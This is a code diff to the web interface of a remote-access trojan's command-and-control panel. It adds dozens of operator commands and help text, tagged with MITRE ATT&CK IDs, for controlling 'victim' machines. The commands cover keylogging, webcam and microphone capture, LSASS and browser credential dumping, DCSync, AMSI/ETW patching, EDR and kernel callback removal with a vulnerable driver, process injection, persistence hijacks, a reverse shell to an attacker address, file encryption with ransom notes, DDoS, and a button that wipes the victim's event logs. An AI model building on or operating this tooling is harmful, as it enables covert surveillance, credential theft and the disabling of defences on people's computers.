@@ -903,39 +903,182 @@ function renderSummary(bot) {
       <div class="card-title">Send Command</div>
       ${bot.pendingCmd?'<p style="color:var(--warn);font-size:12px">&#9203; Queued: <code>'+esc(bot.pendingCmd)+'</code></p>':''}
       <div class="cmd-row">
-        <input id="cmd-input" type="text" placeholder="processes | screenshot | dir show C:\\Users | close" list="cmd-sugg">
+        <input id="cmd-input" type="text" placeholder="processes | screenshot | dir show C:\\Users | close" list="cmd-sugg"
+               oninput="showCmdHelp(this.value)">
         <button class="btn btn-send" onclick="sendCmd('${bot.id}')">Send &rarr;</button>
       </div>
+      <div id="cmd-help" style="font-size:11px;color:var(--muted);margin-top:4px;min-height:16px;padding:2px 4px;border-left:2px solid var(--accent);display:none"></div>
       <datalist id="cmd-sugg">
+        <!-- ── Capture ── -->
         <option value="screenshot">
         <option value="webcam capture">
         <option value="mic record 5">
         <option value="mic record 10">
-        <option value="processes">
+        <option value="mic record 30">
+        <!-- ── Keylogger ── -->
         <option value="keylog start">
         <option value="keylog dump">
         <option value="keylog stop">
         <option value="keylog status">
-        <option value="dir show C:\\Users">
-        <option value="dir read C:\\path\\to\\file.txt">
-        <option value="dir write C:\\path\\to\\file.txt content">
-        <option value="dir del_file C:\\path\\to\\file.exe">
+        <!-- ── Clipboard Monitor ── -->
+        <option value="clipmon start">
+        <option value="clipmon dump">
+        <option value="clipmon stop">
+        <option value="clipmon status">
+        <!-- ── System / Shell ── -->
+        <option value="processes">
+        <option value="system whoami">
+        <option value="system hostname">
+        <option value="system ipconfig /all">
+        <option value="system net user">
+        <option value="system net localgroup administrators">
+        <option value="system tasklist">
+        <option value="system netstat -ano">
+        <option value="system systeminfo">
+        <option value="system wmic product get name">
+        <option value="system cmdkey /list">
+        <option value="system arp -a">
+        <option value="system nltest /domain_trusts">
         <option value="run C:\\path\\to\\file.exe">
+        <option value="loader https://example.com/file.exe C:\\Users\\Public\\file.exe">
         <option value="closeproc process.exe">
+        <option value="disable display">
+        <option value="disable pc">
+        <option value="close">
+        <!-- ── File Manager ── -->
+        <option value="dir show C:\\">
+        <option value="dir show C:\\Users">
+        <option value="dir show C:\\Users\\Public">
+        <option value="dir read C:\\path\\to\\file.txt">
+        <option value="dir write C:\\path\\to\\file.txt content here">
+        <option value="dir del_file C:\\path\\to\\file.exe">
+        <option value="pull C:\\path\\to\\file.txt">
+        <option value="pull C:\\Users\\Public\\Documents\\passwords.xlsx">
+        <!-- ── Evasion (AMSI / ETW / unhook / syscalls / sleep obfusc) ── -->
+        <option value="evasion all">
+        <option value="evasion amsi">
+        <option value="evasion etw">
+        <option value="evasion unhook">
+        <option value="evasion hookcheck">
+        <option value="evasion obfsleep 5000">
+        <!-- ── Token Theft ── -->
+        <option value="tokensteal">
+        <option value="tokenshell C:\\Windows\\System32\\cmd.exe">
+        <option value="tokenrevert">
+        <!-- ── Process Injection ── -->
+        <option value="hollow C:\\Windows\\System32\\svchost.exe <base64_shellcode>">
+        <option value="apc <pid> <base64_shellcode>">
+        <option value="inject_dll explorer.exe C:\\Users\\Public\\hook.dll">
+        <option value="inject_shell svchost.exe <shellcode_hex>">
+        <!-- ── Credential Theft ── -->
+        <option value="creddump credman">
+        <option value="creddump chrome">
+        <option value="creddump cookies">
+        <option value="creddump cookiesdb">
+        <option value="lsass dump C:\\Temp\\lsass.dmp">
+        <option value="lsass comsvcs C:\\Temp\\lsass.dmp">
+        <option value="lsass pull">
+        <option value="samdump C:\\Temp">
+        <option value="wifi">
+        <!-- ── Browser History ── -->
+        <option value="browserhistory urls">
+        <option value="browserhistory downloads">
+        <option value="browserhistory db">
+        <!-- ── Document Ops (Excel) ── -->
+        <option value="xlread C:\\path\\file.xlsx Sheet1 A1:D10">
+        <option value="xlwrite C:\\path\\file.xlsx Sheet1 B2 newvalue">
+        <option value="xlrawread C:\\path\\file.xlsx">
+        <option value="xlrawwrite C:\\path\\file.xlsx <base64>">
+        <!-- ── Privilege Escalation ── -->
+        <option value="uac fodhelper cmd.exe">
+        <option value="uac eventvwr cmd.exe">
+        <!-- ── Anti-Forensics ── -->
+        <option value="af clearlogs">
+        <option value="af vssdelete">
+        <option value="af timestomp C:\\path\\to\\file.exe">
+        <option value="af timestomp C:\\path\\to\\file.exe C:\\Windows\\System32\\notepad.exe">
+        <option value="af adswrite C:\\path\\file.txt hiddenstream secretdata">
+        <option value="af adsread C:\\path\\file.txt hiddenstream">
+        <!-- ── Network Discovery ── -->
+        <option value="netscan arp">
+        <option value="netscan sweep 192.168.1">
+        <option value="netscan ports 192.168.1.1 1 1024">
+        <option value="netscan ports 192.168.1.1 1 65535">
+        <!-- ── Persistence ── -->
+        <option value="wmipersist list">
+        <option value="wmipersist install PersistTest C:\\Windows\\System32\\calc.exe">
+        <option value="wmipersist remove PersistTest">
+        <!-- ── Ransomware Simulation ── -->
+        <option value="ransom encrypt C:\\TestFiles testkey123">
+        <option value="ransom decrypt C:\\TestFiles testkey123">
+        <!-- ── Reverse Shell ── -->
+        <option value="revshell status">
+        <option value="revshell connect 10.0.0.5 4444">
+        <option value="revshell disconnect">
+        <!-- ── Service Manager ── -->
         <option value="service show">
         <option value="service start ServiceName">
         <option value="service stop ServiceName">
-        <option value="system ipconfig">
-        <option value="system whoami">
-        <option value="system tasklist">
-        <option value="loader https://example.com/file.exe C:\\dest.exe">
-        <option value="filecrypt C:\\path\\file.txt key">
-        <option value="filedecrypt C:\\path\\file.txt.b4db4b3 key">
-        <option value="botnet start https://target.com">
+        <option value="service delete ServiceName">
+        <option value="service add MySvc &quot;My Service&quot; C:\\tool.exe win32-service auto-start">
+        <!-- ── File Cryptor ── -->
+        <option value="filecrypt C:\\path\\file.docx mypassword123">
+        <option value="filedecrypt C:\\path\\file.docx.b4db4b3 mypassword123">
+        <!-- ── BotNet / DDoS ── -->
+        <option value="botnet start https://target.example.com">
         <option value="botnet stop">
-        <option value="disable pc">
-        <option value="disable display">
-        <option value="close">
+        <!-- ── Memory Evasion ── -->
+        <option value="pestamp check">
+        <option value="pestamp mz">
+        <option value="pestamp full">
+        <option value="pestamp restore">
+        <option value="isyscall gadget">
+        <option value="stackspoof report">
+        <option value="heapenc test 5000">
+        <option value="stomp list">
+        <!-- ── Process Injection ── -->
+        <option value="apcinject demo C:\\Windows\\System32\\notepad.exe">
+        <option value="apcinject existing 1234">
+        <option value="threadhijack list 1234">
+        <option value="threadhijack hijack 1234">
+        <option value="doppelgang check">
+        <option value="doppelgang spawn C:\\Windows\\System32\\svchost.exe C:\\payload.exe">
+        <!-- ── Anti-Analysis ── -->
+        <option value="antianalysis full">
+        <option value="antianalysis debug">
+        <option value="antianalysis vm">
+        <option value="antianalysis sandbox">
+        <option value="antianalysis user">
+        <!-- ── Persistence (new) ── -->
+        <option value="comhijack find">
+        <option value="comhijack list">
+        <option value="comhijack install {CLSID} C:\\payload.dll">
+        <option value="comhijack remove {CLSID}">
+        <option value="ifeohijack list">
+        <option value="ifeohijack install sethc.exe C:\\payload.exe">
+        <option value="ifeohijack silent taskmgr.exe C:\\payload.exe">
+        <option value="ifeohijack remove sethc.exe">
+        <option value="dllhijack common">
+        <option value="dllhijack scan C:\\Windows\\System32\\msiexec.exe">
+        <!-- ── Credentials (deeper) ── -->
+        <option value="lsasecrets names">
+        <option value="lsasecrets api">
+        <option value="lsasecrets registry">
+        <option value="dcsync check">
+        <option value="dcsync privcheck">
+        <option value="dcsync enum">
+        <option value="dcsync replicate Administrator">
+        <!-- ── Kernel (BYOVD) ── -->
+        <option value="byovd status">
+        <option value="byovd demo C:\\RTCore64.sys">
+        <option value="kernelunhook list">
+        <option value="kernelunhook remove">
+        <option value="kernelunhook nuke">
+        <option value="etwti check">
+        <option value="etwti blind">
+        <option value="etwti restore">
+        <!-- ── Cleanup / Uninstall ── -->
+        <option value="uninstall">
       </datalist>
     </div>
     <div class="card">
@@ -951,9 +1094,10 @@ function renderSummary(bot) {
     <div class="card">
       <div class="section-hdr">
         <div class="card-title">Results (${bot.results.length})</div>
-        <div style="display:flex;gap:6px">
+        <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
           <button class="btn btn-sec" onclick="renderBot('${bot.id}')">&#8635;</button>
-          <button class="btn btn-danger" onclick="clearResults('${bot.id}')">Clear</button>
+          <button class="btn btn-danger" onclick="clearResults('${bot.id}')" title="Delete all stored results from the C2 server">Clear C2 Results</button>
+          <button class="btn btn-danger" style="font-size:11px" onclick="sendCmdDirect('${bot.id}','af clearlogs')" title="Wipe all Windows Event Log channels on the target (victim-side)">Wipe Victim Logs</button>
         </div>
       </div>
       <div class="results-box">
@@ -1422,6 +1566,188 @@ function buildIncidentsHtml(incidents, botId) {
       ${evidenceHtml?'<div class="inc-evidence">'+evidenceHtml+'</div>':''}
     </div>`;
   }).join('');
+}
+
+// ── Command help lookup ───────────────────────────────────────────────────────
+const CMD_HELP = {
+  // Capture
+  'screenshot':        'T1113 — Capture a screenshot of the victim desktop and return it as base64 PNG',
+  'screenshot start':  'T1113 — Begin continuous background screenshots every N seconds (default 30)',
+  'screenshot stop':   'T1113 — Stop continuous screenshot loop',
+  // Keylogger
+  'keylogger start':   'T1056.001 — Install a low-level keyboard hook; accumulates keystrokes in memory',
+  'keylogger stop':    'T1056.001 — Remove keyboard hook',
+  'keylogger dump':    'T1056.001 — Return all buffered keystrokes and clear the buffer',
+  // Clipboard
+  'clip start':        'T1115 — Begin background clipboard monitor; records every new clipboard value',
+  'clip stop':         'T1115 — Stop clipboard monitor',
+  'clip dump':         'T1115 — Return all captured clipboard contents',
+  // System / Shell
+  'sysinfo':           'T1082 — Gather hostname, OS, CPU, RAM, disk, user, domain, uptime',
+  'shell':             'T1059.003 — Run a cmd.exe command and return stdout+stderr',
+  'processes':         'T1057 — List all running processes (PID, name, session)',
+  'services':          'T1007 — List all Windows services with status and start type',
+  'users':             'T1087 — List local accounts and group membership',
+  'netinfo':           'T1016 — Show IP config, ARP cache, routing table, DNS',
+  // File Manager
+  'dir show':          'T1083 — List directory contents (dir show <path>)',
+  'dir read':          'T1005 — Read a file and return its contents (dir read <path>)',
+  'dir upload':        'T1005 — Read a file and return base64 content for exfil',
+  'dir delete':        'T1070.004 — Delete a file (dir delete <path>)',
+  'dir copy':          'T1005 — Copy a file (dir copy <src> <dst>)',
+  'dir mkdir':         'T1083 — Create a directory (dir mkdir <path>)',
+  'dir write':         'T1030 — Write base64 data to a file (dir write <path> <b64>)',
+  // Evasion
+  'evasion amsi':      'T1562.001 — Patch AMSI AmsiScanBuffer in-process to return AMSI_RESULT_CLEAN',
+  'evasion etw':       'T1562.006 — Blind ETW event provider by patching EtwEventWrite to RET',
+  'evasion unhook':    'T1055 — Reload ntdll.dll from disk to remove EDR user-mode API hooks',
+  'evasion hookcheck': 'T1106 — Scan ntdll stubs and report which Nt* functions are hooked by EDR/AV (shows exact hook count)',
+  'evasion obfsleep':  'T1497.003 — Encrypt .text section → sleep N ms → decrypt. Scan the process during sleep to test memory scanner coverage (evasion obfsleep <ms>)',
+  // Token Theft
+  'token steal':       'T1134.001 — Steal a SYSTEM token from a SYSTEM process and impersonate it',
+  'token spawn':       'T1134.002 — Spawn a new elevated cmd.exe using a stolen SYSTEM token',
+  'token revert':      'T1134 — Revert thread token back to original user context',
+  // Process Injection
+  'inject hollow':     'T1055.012 — Hollow out svchost.exe and inject shellcode (process hollowing)',
+  'inject ppid':       'T1134.004 — Spawn a process with a spoofed parent PID (see ppidspoof)',
+  // Credential Theft
+  'creds credman':     'T1555.004 — Dump Windows Credential Manager (Generic + Domain secrets)',
+  'creds chrome':      'T1555.003 — Decrypt Chrome saved passwords using DPAPI',
+  'creds cookies':     'T1539 — Decrypt Chrome/Edge cookies using DPAPI',
+  'creds cookiedb':    'T1539 — Return raw path to the browser cookie SQLite DB for upload',
+  // LSASS / Hashes
+  'lsass direct':      'T1003.001 — Dump LSASS memory to disk using direct MiniDumpWriteDump (T1003.001)',
+  'lsass comsvcs':     'T1003.001 — Dump LSASS via comsvcs.dll MiniDump (LOLBin, lower AV detection)',
+  'lsass sam':         'T1003.002 — Save SAM+SYSTEM+SECURITY hives to disk (offline hash extraction)',
+  'lsass wifi':        'T1555 — Dump all saved Wi-Fi profiles and cleartext PSKs',
+  // Browser History
+  'browserhistory urls':       'T1217 — Extract visited URLs from Chrome/Edge History SQLite DB',
+  'browserhistory downloads':  'T1217 — Extract download file paths from Chrome/Edge History DB',
+  'browserhistory db':         'T1217 — Return path to a temp copy of the browser History DB for upload',
+  // Document Ops
+  'docops readexcel':  'T1005 — Read an Excel file via COM automation and return cell data',
+  'docops writeexcel': 'T1565 — Write data into an Excel cell via COM automation',
+  'docops read64':     'T1005 — Read any file and return base64-encoded content',
+  'docops write64':    'T1030 — Write base64-encoded data to a file',
+  // Privilege Escalation
+  'privesc uac':       'T1548.002 — Silent UAC bypass via CMSTPLUA COM→SilentCleanup→fodhelper chain (no popup)',
+  'privesc token':     'T1134.001 — Attempt token impersonation for privilege escalation',
+  // Anti-Forensics
+  'af clearlogs':      'T1070.001 — Wipe ALL Windows Event Log channels on the victim machine',
+  'af timestomp':      'T1070.006 — Overwrite file MACB timestamps to blend with system files',
+  'af shredfile':      'T1070.004 — Overwrite a file with random bytes before deletion',
+  // Network Discovery
+  'netscan sweep':     'T1018/T1046 — ICMP ping sweep of subnet (netscan sweep <x.x.x>), returns alive hosts',
+  'netscan ports':     'T1046 — TCP connect port scan (netscan ports <ip> <start> <end>)',
+  'netscan arp':       'T1016 — Passive ARP cache dump — IP+MAC pairs currently in the ARP table',
+  // Persistence
+  'wmipersist install':'T1546.003 — Install WMI permanent event subscription (fires cmd on user logon)',
+  'wmipersist remove': 'T1546.003 — Remove a named WMI event subscription',
+  'wmipersist list':   'T1546.003 — List all installed WMI __EventFilter subscriptions',
+  // Ransomware Sim
+  'ransom encrypt':    'T1486 — Recursively encrypt files in a directory (simulation — adds .b4db4b3 + ransom note)',
+  'ransom decrypt':    'T1486 — Decrypt files previously encrypted by ransom encrypt and remove ransom notes',
+  // Reverse Shell
+  'revshell connect':  'T1059.003/T1071 — Open reverse TCP shell to attacker IP:port (revshell connect <ip> <port>)',
+  'revshell disconnect':'T1059.003 — Close reverse shell connection',
+  'revshell status':   'T1059.003 — Check whether the reverse shell thread is currently running',
+  // PPID Spoofing
+  'ppidspoof':         'T1134.004 — Spawn a process with a spoofed parent PID (ppidspoof <pid|explorer|svchost> <cmdline>)',
+  'ppidspoof findpid': 'T1134.004 — Find the PID of a named process (ppidspoof findpid <name.exe>)',
+  // Defense Kill
+  'defkill defender':  'T1562.001 — Disable Windows Defender (registry + Set-MpPreference + stop WinDefend service)',
+  'defkill firewall':  'T1562.004 — Disable Windows Firewall on all profiles (registry + netsh)',
+  'defkill taskmgr':   'T1562.001 — Block Task Manager via HKCU DisableTaskMgr registry key',
+  'defkill exclude':   'T1562.001 — Add a path to Windows Defender exclusion list (Add-MpPreference)',
+  'defkill defender enable': 'T1562.001 — Re-enable Windows Defender (restore registry + restart service)',
+  'defkill firewall enable': 'T1562.004 — Re-enable Windows Firewall on all profiles',
+  // Service Manager
+  'svc start':         'T1569.002 — Start a Windows service (svc start <name>)',
+  'svc stop':          'T1489 — Stop a Windows service (svc stop <name>)',
+  'svc create':        'T1543.003 — Create and start a new service for persistence',
+  'svc delete':        'T1543.003 — Delete a named service',
+  // File Cryptor
+  'crypt file':        'T1027 — XOR-encrypt a single file (crypt file <path> <key>)',
+  'crypt dir':         'T1027 — XOR-encrypt all files in a directory recursively',
+  // Memory Evasion
+  'pestamp check':     'T1027 — Report current PE header state (MZ/NT intact or stomped)',
+  'pestamp mz':        'T1027 — Zero MZ magic bytes in the loaded image — defeats signature-based memory scanners',
+  'pestamp full':      'T1027 — Wipe entire DOS+NT headers — process image is invisible to PE-based memory scanners',
+  'pestamp restore':   'T1027 — Restore previously stomped headers from saved copy',
+  'isyscall gadget':   'T1106 — Show ntdll syscall;ret gadget address — all indirect syscalls originate here (inside ntdll, passes EDR origin checks)',
+  'stackspoof report': 'T1134 — Show spoofed vs real call stack gadget addresses — EDR call-stack walk sees only legitimate module frames',
+  'heapenc test':      'T1497.003 — Encrypt all heap chunks, sleep N ms, decrypt — heap scanners see random bytes during the sleep window (heapenc test <ms>)',
+  'stomp list':        'T1055.001 — List candidate DLLs for module stomping — code runs attributed to a signed system DLL',
+  // Process Injection
+  'apcinject demo':    'T1055.004 — Early-bird APC injection into a new suspended process — fires before EDR hooks are installed (apcinject demo [exe_path])',
+  'apcinject existing':'T1055.004 — Queue APC to all threads in an existing process — fires when any thread enters alertable wait',
+  'threadhijack list': 'T1055.003 — List all threads in a target process (threadhijack list <pid>)',
+  'threadhijack hijack':'T1055.003 — Hijack a thread via SuspendThread+SetThreadContext (no CreateRemoteThread — different EDR code path)',
+  'doppelgang check':  'T1055.013 — Check if TxF (NTFS transactions) is available for process doppelgänging',
+  'doppelgang spawn':  'T1055.013 — Spawn payload masquerading as a signed host EXE using TxF — on-disk file is clean, in-memory is payload',
+  // Anti-Analysis
+  'antianalysis full':    'T1622/T1497 — Run all anti-debug, anti-VM, anti-sandbox, and user-activity checks',
+  'antianalysis debug':   'T1622 — Check for debugger: IsDebuggerPresent, NtQIP debug port, heap flags, RDTSC timing',
+  'antianalysis vm':      'T1497.001 — Check for VM: CPUID hypervisor bit, vendor string, VMware/VBox registry, MAC OUI prefix',
+  'antianalysis sandbox': 'T1497.003 — Check for sandbox: known usernames, uptime, CPU count, disk size, screen resolution',
+  'antianalysis user':    'T1497.002 — Check user activity: mouse movement, foreground window changes, clipboard content',
+  // Persistence (new)
+  'comhijack find':    'T1546.015 — Find CLSIDs hijackable via HKCU (registered in HKLM but not HKCU) — no admin needed',
+  'comhijack list':    'T1546.015 — List all HKCU COM object overrides currently installed',
+  'comhijack install': 'T1546.015 — Install HKCU CLSID override → DLL loaded on every COM activation of that CLSID',
+  'comhijack remove':  'T1546.015 — Remove HKCU COM hijack for a given CLSID',
+  'ifeohijack list':   'T1546.012 — List all Image File Execution Options Debugger entries currently set',
+  'ifeohijack install':'T1546.012 — IFEO hijack: our EXE runs instead of target on every launch (includes lock-screen targets like sethc.exe)',
+  'ifeohijack silent': 'T1546.012 — Silent exit monitor: our EXE spawns alongside target process without replacing it',
+  'ifeohijack remove': 'T1546.012 — Remove IFEO hijack for target executable',
+  'dllhijack common':  'T1574.001 — List well-known DLL search-order hijack targets (common system tools with missing imports)',
+  'dllhijack scan':    'T1574.001 — Scan a specific EXE for imports missing from its directory — hijackable DLL names',
+  // Credentials (deeper)
+  'lsasecrets names':  'T1003.004 — List LSA secret key names in HKLM\\SECURITY (requires SYSTEM token)',
+  'lsasecrets api':    'T1003.004 — Dump LSA secrets via LsaRetrievePrivateData — generates Security event 4662',
+  'lsasecrets registry':'T1003.004 — Save SECURITY+SYSTEM hives to disk for offline parsing — bypasses LsaRetrievePrivateData audit',
+  'dcsync check':      'T1003.006 — Check if machine is domain-joined and DC is reachable',
+  'dcsync privcheck':  'T1003.006 — Check if current account has Replicating Directory Changes permissions',
+  'dcsync enum':       'T1003.006 — Enumerate domain users via LDAP (preliminary step, generates LDAP query telemetry)',
+  'dcsync replicate':  'T1003.006 — Request AD replication for a user via DRS — generates Security event 4662 + MDI alert',
+  // Kernel (BYOVD)
+  'byovd status':      'T1068 — Check if RTCore64.sys (vulnerable driver) is currently loaded',
+  'byovd demo':        'T1068 — Load RTCore64.sys, confirm kernel R/W, unload — tests WDAC blocklist + Sysmon EID 6',
+  'kernelunhook list': 'T1014 — List all PsCreateProcessNotifyRoutine callbacks and identify EDR driver names',
+  'kernelunhook remove':'T1562.001 — Remove non-Microsoft kernel process-notify callbacks — EDR blind to process creation',
+  'kernelunhook nuke': 'T1014/T1562.001 — Remove ALL non-MS callbacks from all callback arrays (process, image-load, object)',
+  'etwti check':       'T1562.006 — Check current ETW-Ti kernel provider EnableCount',
+  'etwti blind':       'T1562.006 — Zero ETW-Ti EnableCount — kills kernel-level telemetry for Defender/MDE (requires BYOVD)',
+  'etwti restore':     'T1562.006 — Restore ETW-Ti EnableCount to 1 — re-enable kernel telemetry',
+  // BotNet
+  'botnet list':       '— List all registered bots and their last-seen timestamps',
+  'botnet kick':       '— Remove a bot record from the C2 database',
+  'botnet broadcast':  '— Send the same command to every connected bot simultaneously',
+  // Cleanup / Exit
+  'close':             'T1070 — Terminate the RAT stub process on the victim',
+  'selfdestruct':      'T1070.004 — Delete the RAT executable from disk then terminate',
+  'reboot':            '— Force immediate system reboot on the victim',
+  'logoff':            '— Log off the current interactive user session',
+};
+
+function showCmdHelp(val) {
+  const div = document.getElementById('cmd-help');
+  if (!div) return;
+  const v = (val||'').trim().toLowerCase();
+  if (!v) { div.style.display='none'; return; }
+  // Try longest prefix match
+  let best = null;
+  for (const key of Object.keys(CMD_HELP)) {
+    if (v.startsWith(key.toLowerCase()) || key.toLowerCase().startsWith(v)) {
+      if (!best || key.length > best.length) best = key;
+    }
+  }
+  if (best) {
+    div.textContent = CMD_HELP[best];
+    div.style.display = 'block';
+  } else {
+    div.style.display = 'none';
+  }
 }
 
 // ── Actions ───────────────────────────────────────────────────────────────────
